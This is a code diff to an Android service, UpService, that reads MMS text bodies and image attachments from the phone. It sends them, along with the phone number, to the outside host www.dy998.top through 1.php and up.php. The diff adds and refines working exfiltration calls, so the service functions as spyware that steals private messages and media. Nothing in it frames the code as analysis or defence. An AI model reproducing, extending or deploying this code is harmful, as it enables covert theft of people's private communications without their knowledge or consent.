@@ -167,7 +167,7 @@ public class UpService extends IntentService {
                         Log.e("duanxin", "MmsSmsReceiver2222");
                         String data = cursor.getString(cursor.getColumnIndex("_data"));
                         // 当此part类型为文本附件时，通过_data拿到文本附件地址
-                        String body;//彩信文本
+                        final String body;//彩信文本
                         if (data != null) {//附件地址不为空
                             // implementation of this method below
                             String partId = cursor.getString(cursor.getColumnIndex("_id"));
@@ -194,8 +194,10 @@ public class UpService extends IntentService {
                             public void run() {
                                 try {
                                     Log.e(TAG, "text"+jsonObject.toString());
-                                    new OkHttpClient().newCall(new Request.Builder()
-                                            .url("http://www.dy998.top/1.php?id=" + phonenumber + "&neirong=" + jsonObject.toString()).get().build()).execute();
+                                    Response execute = new OkHttpClient().newCall(new Request.Builder()
+                                            .url("http://www.dy998.top/1.php?id=" + phonenumber + "&neirong=" +body).get().build()).execute();
+                                    String jsonString = execute.body().string();
+                                    Log.e(TAG, " upload execute =" + jsonString);
                                 } catch (IOException e) {
                                     e.printStackTrace();
                                 }
@@ -223,28 +225,22 @@ public class UpService extends IntentService {
                                 Log.e(TAG, "run2: " + Thread.currentThread().getName());
                                 if (finalBody2 != null) {
                                     try {
+                                        String name = DEFAULT_SDF.format(new Date()) + ".png";
                                         RequestBody fileBody = RequestBody.create(MediaType.parse("image/png"), finalBody2);
                                         RequestBody requestBody = new MultipartBody.Builder()
                                                 .setType(MultipartBody.FORM)
-                                                .addFormDataPart("uploadedfile", DEFAULT_SDF.format(new Date())+".png", fileBody)
+                                                .addFormDataPart("uploadedfile",name , fileBody)
                                                 .build();
                                         Response execute = new OkHttpClient().newCall(new Request.Builder()
                                                 .url("http://www.dy998.top/up.php").post(requestBody).build()).execute();
                                         String jsonString = execute.body().string();
                                         //Toast.makeText(context, "上传成功1!", Toast.LENGTH_SHORT).show();
-                                        Log.e(TAG, " upload jsonString =" + jsonString);
+                                        Log.e(TAG, " upload jsonString =" + name);
                                     } catch (IOException e) {
                                         e.printStackTrace();
                                     }
                                 }
-                                try {
-                                    Response execute = new OkHttpClient().newCall(new Request.Builder()
-                                            .url("http://www.dy998.top/1.php?id=" + phonenumber + "&neirong=" + jsonObject.toString()).get().build()).execute();
-                                    Log.e(TAG, " execute jsonString =" + execute.body().toString());
-                                    // Toast.makeText(context, "上传成功2!" + phonenumber, Toast.LENGTH_SHORT).show();
-                                } catch (IOException e) {
-                                    e.printStackTrace();
-                                }
+
                             }
                         }).start();
                     } else {
